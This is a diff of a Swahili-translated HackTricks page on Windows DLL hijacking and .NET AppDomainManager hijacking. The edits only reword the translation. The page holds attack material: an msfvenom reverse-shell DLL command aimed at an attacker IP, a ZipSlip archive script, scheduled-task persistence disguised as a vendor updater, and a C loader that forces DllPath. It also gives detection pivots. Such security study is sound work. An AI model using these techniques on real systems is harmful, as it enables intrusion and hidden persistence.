@@ -3,29 +3,29 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-## Taarifa za Msingi
+## Basic Information
 
-DLL Hijacking inahusisha kudanganya application inayoaminika ipakie DLL yenye madhara. Neno hili linajumuisha mbinu kadhaa kama vile **DLL Spoofing, Injection, na Side-Loading**. Hutumika hasa kwa code execution, kupata persistence, na, mara chache zaidi, privilege escalation. Licha ya kuzingatia escalation hapa, mbinu ya hijacking hubaki ileile bila kujali lengo.
+DLL Hijacking inahusisha kudanganya application inayoaminika ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama vile **DLL Spoofing, Injection, na Side-Loading**. Hutumika hasa kwa code execution, kupata persistence, na, mara chache zaidi, privilege escalation. Ingawa mkazo hapa ni escalation, mbinu ya hijacking hubaki ileile bila kujali lengo.
 
-### Mbinu za Kawaida
+### Common Techniques
 
 Mbinu kadhaa hutumika kwa DLL hijacking, na ufanisi wa kila moja hutegemea mkakati wa application wa kupakia DLL:<sup>[[4]](#references)</sup>
 
-1. **DLL Replacement**: Kubadilisha DLL halisi na yenye madhara, kwa hiari ukitumia DLL Proxying ili kuhifadhi utendaji wa DLL ya awali.
-2. **DLL Search Order Hijacking**: Kuweka DLL yenye madhara kwenye search path iliyo mbele ya ile halali, kwa kutumia search pattern ya application.
-3. **Phantom DLL Hijacking**: Kuunda DLL yenye madhara ambayo application itapakia, ikidhani kuwa ni DLL inayohitajika lakini ambayo haipo.
-4. **DLL Redirection**: Kubadilisha search parameters kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza application kwenye DLL yenye madhara.
-5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na inayolingana yenye madhara kwenye directory ya WinSxS, mbinu ambayo mara nyingi huhusishwa na DLL side-loading.
-6. **Relative Path DLL Hijacking**: Kuweka DLL yenye madhara kwenye directory inayodhibitiwa na user pamoja na application iliyonakiliwa, ikifanana na mbinu za Binary Proxy Execution.
+1. **DLL Replacement**: Kubadilisha DLL halali na DLL hasidi, kwa hiari ukitumia DLL Proxying ili kuhifadhi utendaji wa DLL asilia.
+2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye search path iliyo mbele ya ile halali, kwa kutumia search pattern ya application.
+3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo application itapakia, ikidhani kuwa ni DLL inayohitajika lakini ambayo haipo.
+4. **DLL Redirection**: Kubadilisha search parameters kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza application kwenye DLL hasidi.
+5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na inayofanana lakini hasidi kwenye directory ya WinSxS; hii mara nyingi huhusishwa na DLL side-loading.
+6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye directory inayodhibitiwa na mtumiaji pamoja na application iliyonakiliwa, ikifanana na mbinu za Binary Proxy Execution.
 
 
 ### AppDomainManager hijacking (`<exe>.config` + attacker assembly)
 
-Classic DLL sideloading siyo njia pekee ya kufanya process inayoaminika ya **.NET Framework** ipakie attacker code. Ikiwa executable inayolengwa ni application ya **managed**, CLR pia hukagua **application configuration file** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na attacker na iliyowekwa karibu na EXE, CLR huipakia **kabla ya njia ya kawaida ya code ya application** na kuiendesha ndani ya process inayoaminika.<sup>[[24]](#references)</sup>
+Classic DLL sideloading siyo njia pekee ya kufanya process inayoaminika ya **.NET Framework** ipakie attacker code. Ikiwa executable inayolengwa ni application ya **managed**, CLR pia huangalia application configuration file yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na attacker iliyowekwa karibu na EXE, CLR huipakia **kabla ya application's normal code path** na kuiendesha ndani ya process inayoaminika.<sup>[[24]](#references)</sup>
 
-Kulingana na .NET Framework configuration schema ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` zote lazima ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>
+Kulingana na Microsoft's .NET Framework configuration schema, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima zote ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>
 
-Config ya msingi:
+Minimal config:
 ```xml
 <configuration>
 <runtime>
@@ -34,7 +34,7 @@ Config ya msingi:
 </runtime>
 </configuration>
 ```
-Msimamizi wa chini kabisa:
+Msimamizi mdogo:
 ```csharp
 using System; using System.Runtime.InteropServices;
 public sealed class Loader : AppDomainManager {
@@ -44,65 +44,65 @@ MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0
 }
 }
 ```
-Practical notes:
-- Hii ni tradecraft maalum ya **.NET Framework**. Inategemea uchanganuzi wa CLR config, si mpangilio wa utafutaji wa Win32 DLL.
-- Host lazima iwe **managed EXE** halisi. Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye PE metadata.
-- Jina la config lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwa **next to the EXE**.
-- Hii ni muhimu kwa **signed Microsoft/vendor binaries** kwa sababu trusted EXE hubaki bila kuguswa, huku malicious managed assembly iki-execute in-process.
-- Ikiwa tayari una installer/update directory inayoweza kuandikwa, AppDomainManager hijacking inaweza kutumika kama **first stage**, ikifuatiwa na classic DLL sideloading au reflective loading kwa stages zinazofuata.
+Maelezo ya vitendo:
+- Hii ni tradecraft maalum kwa **.NET Framework**. Inategemea uchanganuzi wa CLR config, si mpangilio wa utafutaji wa Win32 DLL.
+- Host lazima iwe **managed EXE** halisi. Triage ya haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
+- Jina la config lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwa **pamoja na EXE**.
+- Hii ni muhimu kwa kutumia **signed Microsoft/vendor binaries** kwa sababu EXE inayoaminika hubaki bila kuguswa, huku malicious managed assembly iki-execute ndani ya process hiyo.
+- Ikiwa tayari una writable installer/update directory, AppDomainManager hijacking inaweza kutumiwa kama **first stage**, ikifuatiwa na classic DLL sideloading au reflective loading kwa stages zinazofuata.
 
 ### AppDomainManager kama downloader + scheduled-task bootstrap
 
-Mfumo wa intrusion unaotumika kwa vitendo ni kuoanisha managed EXE inayoaminika na `*.config` yenye malicious pamoja na AppDomainManager DLL yenye malicious inayofanya kazi kama **small bootstrapper**:<sup>[[25]](#references)</sup>
+Mfumo wa intrusion unaotumika kwa vitendo ni kuoanisha managed EXE inayoaminika na `*.config` yenye malicious pamoja na malicious AppDomainManager DLL inayofanya kazi kama **small bootstrapper**:<sup>[[25]](#references)</sup>
 
-1. User huzindua signed .NET installer au updater kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
-2. Config iliyo karibu husababisha CLR kupakia attacker assembly **kabla** legitimate app logic kuanza.
+1. Mtumiaji anazindua signed .NET installer au updater kutoka location inayoaminika, kama `%USERPROFILE%\Downloads`.
+2. Config iliyo karibu husababisha CLR ku-load attacker assembly **kabla** logic halali ya app kuanza.
 3. Malicious manager hufanya **path gate** (kwa mfano, kuendelea tu ikiwa host EXE ina-run kutoka `Downloads`, na kuruhusu second stage i-run kutoka `%LOCALAPPDATA%` pekee).
-4. Ikiwa check itapita, hupakua real payload kwenye path inayoweza kuandikwa na user, kama `%LOCALAPPDATA%\PerfWatson2.exe`, na huweka persistence kwa scheduled task.
+4. Ikiwa check itapita, inapakua payload halisi kwenye path inayoweza kuandikwa na user kama `%LOCALAPPDATA%\PerfWatson2.exe` na inaweka persistence kwa scheduled task.
 
 Kwa nini variant hii ni muhimu:
 - Signed host EXE hubaki bila kubadilishwa, hivyo triage inayohash main binary pekee inaweza kukosa compromise.
-- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha ZIP/EXE/DLL triad hadi Desktop, Temp, au sandbox path kunaweza kuvunja chain kwa makusudi.
-- First-stage AppDomainManager DLL inaweza kubaki ndogo na yenye low-noise huku real implant ikipakuliwa baadaye.
+- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha ZIP/EXE/DLL triad hadi Desktop, Temp, au sandbox path kunaweza kuvunja chain kimakusudi.
+- AppDomainManager DLL ya first stage inaweza kubaki ndogo na yenye noise kidogo, huku implant halisi ikipakuliwa baadaye.
 
-Mfano wa minimal persistence unaoonekana mara kwa mara kwenye pattern hii:
+Mfano mdogo wa persistence unaoonekana mara kwa mara kwenye pattern hii:
 ```cmd
 schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
 ```
-Notes:
-- ` /rl highest` means **highest available** kwa huyo user/session; si escalation ya SYSTEM iliyohakikishwa yenyewe.
-- Technique hii mara nyingi huainishwa vizuri zaidi kama **execution/persistence via .NET config abuse** kuliko classic missing-DLL search-order hijacking, ingawa operators mara nyingi huziunganisha zote mbili.
+Maelezo:
+- ` /rl highest` humaanisha **ya juu zaidi inayopatikana** kwa user/session huyo; si escalation ya uhakika hadi SYSTEM yenyewe.
+- Technique hii mara nyingi huainishwa vizuri zaidi kama **execution/persistence kupitia .NET config abuse** kuliko classic missing-DLL search-order hijacking, ingawa operators mara nyingi huunganisha techniques zote mbili.
 
-Detection pivots:
-- Signed .NET executables zinazoanzishwa kutoka **ZIP extraction paths**, `Downloads`, `%TEMP%`, au folders nyingine zinazoweza kuandikwa na user, zikiwa na `<exe>.config` **colocated**.
+Vigezo vya detection:
+- Signed .NET executables zinazoanzishwa kutoka **ZIP extraction paths**, `Downloads`, `%TEMP%`, au folders nyingine zinazoandikika na user, zikiwa na `<exe>.config` **iliyo pamoja**.
 - Scheduled tasks mpya ambazo action yake inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na majina yake yanafanana na browser/vendor updaters.
-- Managed bootstrap processes za muda mfupi ambazo hupakua EXE nyingine mara moja, kisha kuanzisha `schtasks.exe`.
-- Samples zinazo-exit mapema isipokuwa executable path ilingane na user-profile directory inayotarajiwa.
+- Managed bootstrap processes zenye maisha mafupi ambazo hupakua EXE nyingine mara moja, kisha huanzisha `schtasks.exe`.
+- Samples zinazoacha kufanya kazi mapema isipokuwa executable path ifanane na user-profile directory inayotarajiwa.
 
-### Hijacking an existing scheduled task to relaunch the sideload chain
+### Hijacking scheduled task iliyopo ili kuanzisha tena sideload chain
 
-Kwa persistence, usitafute tu **creating a new task**. Baadhi ya intrusion sets husubiri installer halali iunde **normal updater task**, kisha **rewrite task action** ili jina, author, na trigger zilizopo zibaki zinazojulikana kwa defenders.
+Kwa persistence, usitafute tu **kuunda task mpya**. Baadhi ya intrusion sets husubiri hadi installer halali iunde **normal updater task**, kisha huandika upya task action ili jina, author, na trigger zilizopo zibaki zinajulikana kwa defenders.
 
-Reusable workflow:
+Workflow inayoweza kutumika tena:
 1. Install/run software halali na utambue task ambayo kwa kawaida huunda.
-2. Export task XML na uandike values za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
-3. Replace action pekee ili task ianzishe **trusted host EXE** yako kutoka user-writable staging directory, ambayo kisha hu-sideload au AppDomain-load real payload.
-4. Re-register task hiyo kwa jina lilelile badala ya kuunda persistence artifact mpya inayoonekana wazi.
+2. Export task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
+3. Badilisha action pekee ili task ianzishe **trusted host EXE** yako kutoka user-writable staging directory, ambayo kisha hu-sideload au AppDomain-load real payload.
+4. Sajili tena task kwa jina hilohilo badala ya kuunda persistence artifact mpya iliyo wazi.
 ```cmd
 schtasks /query /tn "<TaskName>" /xml > task.xml
 :: edit the <Exec><Command> and optional <Arguments> nodes
 schtasks /create /tn "<TaskName>" /xml task.xml /f
 ```
 Kwa nini ni stealthier:
-- Jina la task bado linaweza kuonekana kuwa halali (kwa mfano updater wa vendor).
-- **Task Scheduler service** ndiyo hui-launch, hivyo parent/ancestor validation mara nyingi huona scheduling chain inayotarajiwa badala ya `explorer.exe`.
-- Timu za DFIR zinazotafuta tu **task names mpya** zinaweza kukosa task ambayo registration yake tayari ilikuwepo, lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au path nyingine inayodhibitiwa na attacker.
+- Jina la task bado linaweza kuonekana kuwa halali (kwa mfano updater ya vendor).
+- **Task Scheduler service** hui-launch, kwa hivyo parent/ancestor validation mara nyingi huona scheduling chain inayotarajiwa badala ya `explorer.exe`.
+- Timu za DFIR zinazotafuta tu **majina mapya ya task** zinaweza kukosa task ambayo registration yake tayari ilikuwepo, lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au path nyingine inayodhibitiwa na attacker.
 
 Fast hunting pivots:
 - `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
 - `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
 - Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` dhidi ya baseline.
-- Toa alert wakati **vendor-looking updater task** inatekelezwa kutoka **user-writable directories** au inapozindua .NET EXE yenye faili ya `*.config` iliyo colocated.
+- Toa alert wakati **vendor-looking updater task** inatekelezwa kutoka **directories zinazoweza kuandikwa na user** au inapozindua .NET EXE yenye `*.config` file iliyoko pamoja nayo.
 
 > [!TIP]
 > Kwa chain ya hatua kwa hatua inayoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, pitia workflow iliyo hapa chini.
@@ -111,79 +111,79 @@ Fast hunting pivots:
 advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Kutafuta DLL zilizokosekana
+## Kupata DLL zinazokosekana
 
-Njia ya kawaida zaidi ya kutafuta DLL zilizokosekana ndani ya system ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:
+Njia ya kawaida zaidi ya kupata DLL zinazokosekana ndani ya system ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:
 
-![Common Techniques - Kutafuta DLL zilizokosekana: Njia ya kawaida zaidi ya kutafuta DLL zilizokosekana ndani ya system ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)
+![Common Techniques - Kupata DLL zinazokosekana: Njia ya kawaida zaidi ya kupata DLL zinazokosekana ndani ya system ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)
 
-![Common Techniques - Kutafuta DLL zilizokosekana: Njia ya kawaida zaidi ya kutafuta DLL zilizokosekana ndani ya system ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)
+![Common Techniques - Kupata DLL zinazokosekana: Njia ya kawaida zaidi ya kupata DLL zinazokosekana ndani ya system ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)
 
 na uonyeshe tu **File System Activity**:
 
-![Common Techniques - Kutafuta DLL zilizokosekana: na uonyeshe tu File System Activity](<../../../images/image (153).png>)
+![Common Techniques - Kupata DLL zinazokosekana: na uonyeshe tu File System Activity](<../../../images/image (153).png>)
 
-Ikiwa unatafuta **DLL zilizokosekana kwa ujumla**, **iache** hii ikiendelea kwa **sekunde** kadhaa.\
-Ikiwa unatafuta **DLL iliyokosekana ndani ya executable maalum**, unapaswa kuweka filter nyingine kama `"Process Name" "contains" <exec name>`, kui-execute, kisha usitishe kunasa events**.<sup>[[9]](#references)</sup>
+Ikiwa unatafuta **DLL zinazokosekana kwa ujumla**, **iache** ikiendelea kwa **sekunde** kadhaa.\
+Ikiwa unatafuta **DLL iliyokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, i-execute, kisha simamisha kunasa events.<sup>[[9]](#references)</sup>
 
-## Kutumia DLL zilizokosekana
+## Kutumia DLL zinazokosekana
 
-Ili ku-escalate privileges, nafasi bora tuliyo nayo ni kuweza **kuandika DLL ambayo privilege process itajaribu ku-load** katika mojawapo ya **maeneo ambayo itatafutwa**. Kwa hiyo, tutaweza **kuandika** DLL katika **folder** ambayo **DLL inatafutwa kabla** ya folder lililo na **DLL ya awali** (hali isiyo ya kawaida), au tutaweza **kuandika katika folder fulani ambako DLL itatafutwa** na DLL ya awali **haipo** katika folder yoyote.
+Ili kufanya privilege escalation, tafuta **DLL ambayo privileged process hujaribu ku-load** kutoka location ambayo unaweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au wakati DLL iliyoombwa haipo na unaweza kuandika kwenye mojawapo ya directories zinazotafutwa.
 
-### Mpangilio wa Utafutaji wa DLL
+### Mpangilio wa Kutafuta DLL
 
-**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi DLL zinavyo-loadiwa kwa usahihi.**
+**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi DLL zinavyo-loadiwa hasa.**
 
-**Windows applications** hutafuta DLL kwa kufuata seti ya **pre-defined search paths**, kwa kuzingatia mfuatano maalum. Tatizo la DLL hijacking hutokea wakati DLL yenye madhara inapowekwa kimkakati katika mojawapo ya directories hizi, na hivyo kuhakikisha kwamba ina-loadiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLL inayohitaji.
+**Windows applications** hutafuta DLL kwa kufuata seti ya **pre-defined search paths**, kwa kuzingatia mpangilio maalum. Tatizo la DLL hijacking hutokea wakati DLL hatari inapowekwa kimkakati katika mojawapo ya directories hizi, ili ihakikishe kwamba inaloadiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLL inazohitaji.
 
-Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye** systems za **32-bit** hapa chini:
+Unaweza kuona **mpangilio wa kutafuta DLL kwenye** systems za **32-bit** hapa chini:
 
-1. Directory ambako application ilipo-load.
+1. Directory ambayo application ilipakia.
 2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata path ya directory hii.(_C:\Windows\System32_)
-3. 16-bit system directory. Hakuna function inayopata path ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
+3. 16-bit system directory. Hakuna function inayopata path ya directory hii, lakini hutafutwa. (_C:\Windows\System_)
 4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata path ya directory hii.
 1. (_C:\Windows_)
 5. Current directory.
-6. Directories zilizoorodheshwa katika PATH environment variable. Kumbuka kwamba hii haijumuishi per-application path iliyoainishwa na **App Paths** registry key. **App Paths** key haitumiki wakati wa kukokotoa DLL search path.
+6. Directories zilizoorodheshwa kwenye PATH environment variable. Kumbuka kwamba hii haijumuishi per-application path iliyobainishwa na **App Paths** registry key. **App Paths** key haitumiki wakati wa kuhesabu DLL search path.
 
-Huo ndio mpangilio wa **default** wa utafutaji ukiwa na **SafeDllSearchMode** enabled. Ikiwa ime-disabled, current directory hupanda hadi nafasi ya pili. Ili ku-disable feature hii, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (default ni enabled).
+Huo ndio mpangilio wa **default** wa kutafuta ukiwa na **SafeDllSearchMode** enabled. Ikiwa imezimwa, current directory hupanda hadi nafasi ya pili. Ili kuzima feature hii, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (default ni enabled).
 
-Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa ikiwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza katika directory ya executable module ambayo **LoadLibraryEx** ina-load.
+Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa ikiwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inaload.
 
-Mwisho, kumbuka kwamba **DLL inaweza ku-loadiwa kwa kuonyesha absolute path badala ya jina pekee**. Katika hali hiyo DLL hiyo **itatafutwa tu katika path hiyo** (ikiwa DLL ina dependencies, zitat searchwa kama zilivyo-loadiwa kwa jina pekee).
+Mwishowe, DLL inaweza kupakiwa kwa absolute path badala ya jina. Katika hali hiyo, Windows hutazama path hiyo pekee kwa ajili ya DLL yenyewe; dependencies zilizoombwa kwa jina bado hufuata search order inayotumika.
 
-Kuna njia nyingine za kubadilisha njia za kubadilisha search order, lakini sitazieleza hapa.
+Kuna njia nyingine za kubadilisha search order, lakini sitazieleza hapa.
 
 ### Kuunganisha arbitrary file write na missing-DLL hijack
 
-1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process inazichunguza lakini haiwezi kuzipata.<sup>[[14]](#references)</sup>
-2. Ikiwa binary inaendeshwa kwenye **schedule/service**, kuweka DLL yenye mojawapo ya majina hayo katika **application directory** (search-order entry #1) kutaifanya i-loadiwe wakati wa execution inayofuata. Katika hali moja ya .NET scanner, process ilitafuta `hostfxr.dll` katika `C:\samples\app\` kabla ya ku-load copy halisi kutoka `C:\Program Files\dotnet\fxr\...`.
+1. Tumia **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process hujaribu kuyatafuta lakini haiwezi kuyapata.<sup>[[14]](#references)</sup>
+2. Ikiwa binary inaendeshwa kwa **schedule/service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (search-order entry #1) kutaifanya ipakwe kwenye execution inayofuata. Katika hali moja ya .NET scanner, process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia copy halisi kutoka `C:\Program Files\dotnet\fxr\...`.
 3. Tengeneza payload DLL (kwa mfano reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
-4. Ikiwa primitive yako ni **arbitrary write ya mtindo wa ZipSlip**, tengeneza ZIP ambayo entry yake inatoka nje ya extraction dir ili DLL itue katika app folder:
+4. Ikiwa primitive yako ni **arbitrary write ya aina ya ZipSlip**, tengeneza ZIP ambayo entry yake hutoka nje ya extraction dir ili DLL iwekwe kwenye app folder:
 ```python
 import zipfile
 with zipfile.ZipFile("slip-shell.zip", "w") as z:
 z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
 ```
-5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyopangwa itakapoanzisha tena process, itapakia DLL hasidi na kutekeleza code yako kama service account.
+5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyoratibiwa itakapoanzisha tena process, itapakia DLL hasidi na kutekeleza code yako kwa kutumia service account.
 
 ### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath
 
-Njia ya hali ya juu ya kudhibiti kwa uhakika DLL search path ya process mpya iliyoundwa ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na attacker hapa, target process inayotafuta imported DLL kwa jina (bila absolute path na isipotumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.
+Njia ya hali ya juu ya kuathiri kwa uhakika DLL search path ya process mpya inayoundwa ni kuweka sehemu ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na attacker hapa, target process inayotafuta imported DLL kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.
 
 Wazo kuu
-- Tengeneza process parameters kwa kutumia RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unayodhibiti (kwa mfano, directory ambako dropper/unpacker yako ipo).
-- Unda process kwa kutumia RtlCreateUserProcess. Target binary inapotafuta DLL kwa jina, loader itatumia DllPath iliyotolewa wakati wa resolution, hivyo kuwezesha sideloading ya kuaminika hata kama DLL hasidi haijawekwa pamoja na target EXE.
+- Tengeneza process parameters kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unayodhibiti (kwa mfano, directory ambako dropper/unpacker yako ipo).
+- Unda process kwa RtlCreateUserProcess. Binary ya target inapotafuta DLL kwa jina, loader itatumia DllPath iliyotolewa wakati wa resolution, hivyo kuwezesha sideloading ya kuaminika hata wakati DLL hasidi haipo pamoja na target EXE.
 
-Maelezo/limitation
+Maelezo/mipaka
 - Hii huathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri current process pekee.
-- Target lazima i-import au i-LoadLibrary DLL kwa jina (bila absolute path na isipotumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
-- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kuhijackiwa. Forwarded exports na SxS zinaweza kubadilisha precedence.
+- Target lazima i-import au LoadLibrary DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
+- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kutekwa. Forwarded exports na SxS zinaweza kubadilisha precedence.
 
-Minimal C example (ntdll, wide strings, simplified error handling):
+Mfano mdogo wa C (ntdll, wide strings, error handling iliyorahisishwa):
 
 <details>
-<summary>Full C example: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
+<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -257,23 +257,23 @@ return 0;
 </details>
 
 Mfano wa matumizi ya kiutendaji
-- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au kufanya proxy kwa ile halisi) kwenye directory yako ya DllPath.
-- Launch binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina, kwa kutumia technique iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.
+- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au kuelekeza proxy kwenye ile halisi) katika directory yako ya DllPath.
+- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia technique iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.
 
-Technique hii imeonekana in-the-wild kuendesha chains za sideloading za hatua nyingi: launcher ya awali hudondosha helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft na inayoweza kuhijackiwa, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya attacker kutoka staging directory.<sup>[[6]](#references)</sup>
+Technique hii imeonekana inatumika in-the-wild kuendesha chains za sideloading zenye stages nyingi: launcher ya awali huweka helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft na inayoweza kufanyiwa hijack, ikiwa na DllPath maalum ili kulazimisha upakiaji wa DLL ya attacker kutoka staging directory.<sup>[[6]](#references)</sup>
 
 
-### .NET AppDomainManager hijacking via `.exe.config`
+### AppDomainManager hijacking ya .NET kupitia `.exe.config`
 
-Kwa targets za **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kupatch memory kwa kutumia vibaya file ya **`.exe.config`** iliyo karibu na application. Badala ya kutegemea tu Win32 DLL search order, attacker huweka .NET EXE halali kando ya config hasidi na assembly moja au zaidi zinazodhibitiwa na attacker.
+Kwa targets za **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kupatch memory kwa kutumia vibaya faili ya karibu ya **`.exe.config`** ya application. Badala ya kutegemea tu Win32 DLL search order, attacker huweka .NET EXE halali pamoja na config hasidi na assembly moja au zaidi zinazodhibitiwa na attacker.
 
 Jinsi chain inavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
 1. Host EXE huanza na **CLR husoma `<exe>.config`**.
 2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iunde `AppDomainManager` inayodhibitiwa na attacker.
-3. Manager hasidi hupata **utekelezaji wa pre-`Main()`** ndani ya trusted host process.
-4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assembly za local kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha runtime validation/telemetry bila inline patching.
+3. Manager hasidi hupata **utekelezaji wa kabla ya `Main()`** ndani ya process inayoaminika ya host.
